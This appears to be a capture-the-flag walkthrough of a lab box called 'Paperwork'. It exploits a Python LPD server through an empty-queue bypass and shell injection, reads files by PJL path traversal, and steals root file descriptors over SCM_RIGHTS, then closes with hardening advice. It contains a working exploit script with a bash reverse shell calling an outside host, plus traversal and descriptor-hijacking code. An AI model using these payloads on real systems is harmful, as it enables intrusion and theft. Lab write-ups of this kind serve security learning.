## Step 2 - Initial Foothold

### RFC 1179 Line Printer Daemon (LPD) Exploitation

Auditing `server.py` reveals two critical vulnerabilities:

#### 1. Queue Validation Substring Bypass
```python
queue = data[1:].decode().strip()
if queue not in VALID_QUEUE:
    self.sock.send(b'\x01')
    return
```
When `queue` is empty (`""`), Python's `in` operator evaluates `"" in VALID_QUEUE` to `True` for any string! Sending `\x02\n` (command `2` with an empty queue name) completely bypasses the queue name restriction.

#### 2. Shell Command Injection in `job_name`
```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
The script searches the LPD control file for any line starting with uppercase `J` (which denotes the Job Name in RFC 1179). It then passes `job_name` directly into a shell string formatted with `shell=True`. Because there is zero sanitization, inserting a semicolon (`;`) escapes the `echo` command and executes arbitrary commands as the server user!

### Weaponizing LPD on Port 1515

Even though port 1515 was omitted from our initial top-1000 Nmap scan, the server binds to `0.0.0.0:1515`.

We construct an exploit script (`exploit.py`):
1. Connects to `10.129.37.38:1515`.
2. Sends `\x02\n` to initiate the print job with the queue bypass.
3. Transmits an LPD control file subcommand (`\x02<len> cfA001localhost\n`).
4. Injects a reverse shell inside the `J` attribute: `'; bash -c 'bash -i >& /dev/tcp/10.10.14.70/4463 0>&1'; #`.

```python
#!/usr/bin/env python3
import socket
import time

TARGET = "10.129.37.38"
PORT = 1515

command = "bash -c 'bash -i >& /dev/tcp/10.10.14.70/4463 0>&1'"
job_name = f"'; {command}; #"

control_file = ("Hlocalhost\n" "Ptester\n" f"J{job_name}\n").encode()

with socket.create_connection((TARGET, PORT), timeout=5) as sock:
    sock.sendall(b"\x02\n")
    time.sleep(0.3)

    header = b"\x02" + str(len(control_file)).encode() + b" cfA001localhost\n"
    sock.sendall(header)

    ack = sock.recv(1)
    print(f"Header ACK: {ack!r}")

    sock.sendall(control_file + b"\x00")
    try:
        print(f"Final response: {sock.recv(2)!r}")
    except socket.timeout:
        pass
```

### PJL Filesystem Path Traversal

HP JetDirect printers implement PJL filesystem commands:
- `@PJL FSUPLOAD`: Reads and extracts a file from the printer.
- `@PJL FSDOWNLOAD`: Writes a file to the printer filesystem.

Because `jetdirect.py` fails to sanitize directory traversal sequences (`../`), we can read arbitrary files owned by `archivist`!

Let's read `user.txt` using `@PJL FSUPLOAD`:

```bash
python3 -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\r\n")
print(s.recv(4096).decode(errors="ignore"))
s.close()
'
```

### SCM_RIGHTS Ancillary File Descriptor Passing

In Linux IPC, Unix domain sockets (`AF_UNIX`) support passing open file descriptors between processes using ancillary control messages (**`SCM_RIGHTS`**).

> ⚠️ **Technical Detail:**  
> When a privileged root service uses `SCM_RIGHTS` to pass an open file descriptor down a socket connection, the receiving process inherits the exact open file table entry from the kernel. Because the file handle was already opened and authorized by root, **all standard filesystem permission checks are completely bypassed when the client reads from that file descriptor!**

If the management daemon broadcasts or sends configuration file handles to connecting clients, any local user who connects to `/run/paperwork/mgmt.sock` can catch the file descriptor and extract protected files!

---

### Catching File Descriptors via Python `recvmsg()`

We write a Python script that connects to `/run/paperwork/mgmt.sock`, allocates an ancillary message buffer using `socket.CMSG_SPACE()`, and reads the received file descriptors via `os.pread()`:

```python
python3 - <<'PY'
import array, os, socket

# 1. Connect to the management Unix domain socket
s = socket.socket(socket.AF_UNIX)
s.connect("/run/paperwork/mgmt.sock")

# 2. Allocate an ancillary data buffer to receive SCM_RIGHTS control messages
_, anc, _, _ = s.recvmsg(1024, socket.CMSG_SPACE(8))

# 3. Unpack received file descriptors
for cmsg_level, cmsg_type, data in anc:
    fds = array.array("i")
    fds.frombytes(data)
    for fd in fds:
        # 4. Read directly from the root-authenticated file descriptor
        print(f"[+] Hijacked FD {fd} content:\n{os.pread(fd, 1024, 0).decode()}")
PY
```

## Step 5 - Mitigations & Defensive Hardening

To remediate the vulnerabilities identified across the Paperwork environment, administrators should apply defense-in-depth hardening across legacy daemon services, printer APIs, and internal IPC mechanisms:

### 1. Line Printer Daemon (RFC 1179) Hardening
- **Strict Queue Validation:** Replace substring or membership checks (`if queue not in VALID_QUEUE`) with strict equality comparisons (`if queue != EXPECTED_QUEUE`), and explicitly reject empty strings.
- **Eliminate Shell Interpolation in Subprocesses:** Never execute system commands using `shell=True` with unvalidated input. Replace `subprocess.Popen(f"echo ...", shell=True)` with secure Python file I/O operations (`with open('/tmp/archive.log', 'a') as f: f.write(...)`).

### 2. HP JetDirect PJL Access Controls & Path Normalization
- **Disable Arbitrary File System Commands:** Disable filesystem manipulation directives (`@PJL FSUPLOAD` and `@PJL FSDOWNLOAD`) in printer emulation services unless explicitly required.
- **Canonical Path Sanitization:** If file uploads must be supported, enforce strict canonical path validation (`os.path.realpath()`), ensuring destination paths remain strictly confined within a dedicated, unprivileged spool directory.

### 3. Unix Domain Socket (AF_UNIX) Permission Hardening
- **Restrict Socket Permissions:** Set strict file permissions on Unix domain sockets (`/run/paperwork/mgmt.sock`). Restrict ownership to `root:paperwork_admins` and apply `chmod 0660` to prevent arbitrary local users from establishing connections.
- **Audit SCM_RIGHTS File Descriptor Passing:** Never pass open file handles to sensitive configuration files (`admin_pins.conf`) across unauthenticated or unprivileged IPC socket streams. Ensure clients authenticate and demonstrate authorization before file descriptors are transferred.
